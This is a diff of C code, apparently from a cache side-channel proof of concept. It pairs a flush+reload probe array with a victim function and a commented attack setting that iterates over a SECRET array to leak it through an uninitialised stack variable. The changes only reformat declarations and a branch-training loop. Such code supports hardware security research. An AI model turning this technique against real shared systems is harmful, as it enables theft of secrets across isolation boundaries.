@@ -24,17 +24,19 @@ cp_t* flush_reload_arr;
 volatile cp_t cp;   //cache page declared out of function to keep stack of uninit_func() identical to init_func()
 
 void touch_secret(int secret_index) {
-    volatile char __attribute__ ((aligned (PAGE_SIZE))) s = SECRET[secret_index];
+    volatile char __attribute__((aligned(PAGE_SIZE))) s;
+    s = SECRET[secret_index];
     if(DBG)printf("secret\t%p:\t%d\n", &s, s);
 }
 
 void init_func(int val) {
-    volatile char __attribute__ ((aligned (PAGE_SIZE))) init = val;
+    volatile char __attribute__((aligned(PAGE_SIZE))) init;
+    init = val;
     if(DBG)printf("init  \t%p:\t%d\n", &init, init);
 }
 
 void uninit_func() {
-    volatile char __attribute__ ((aligned (PAGE_SIZE))) uninit;
+    volatile char __attribute__((aligned(PAGE_SIZE))) uninit;
     cp = flush_reload_arr[uninit];
     if(DBG)printf("uninit\t%p:\t%d\n", &uninit, uninit);
 }
@@ -49,11 +51,15 @@ void uninit_func() {
  * Attack:   init_bool=true     secret_index={iterate through SECRET}
  */
 void victim_func(char init_bool, int secret_index) {
-    if(init_bool)touch_secret(secret_index);
+    if(init_bool) touch_secret(secret_index);
     //increase branch history for better accuracy
-    for(int i = 0; i < 100; i++) {if(i%2==0) {volatile int x = 0;} else {volatile int x = 1;}}
+    for(int i = 0; i < 100; i++) {
+        if(i%2==0)  {volatile int x = 0;}
+        else        {volatile int x = 1;}
+    }
 
-    int init_bool_copy __attribute__((aligned(CL_SIZE))) = init_bool;
+    int init_bool_copy __attribute__((aligned(CL_SIZE)));
+    init_bool_copy = init_bool;
     flush(&init_bool_copy);
     cpuid();
 
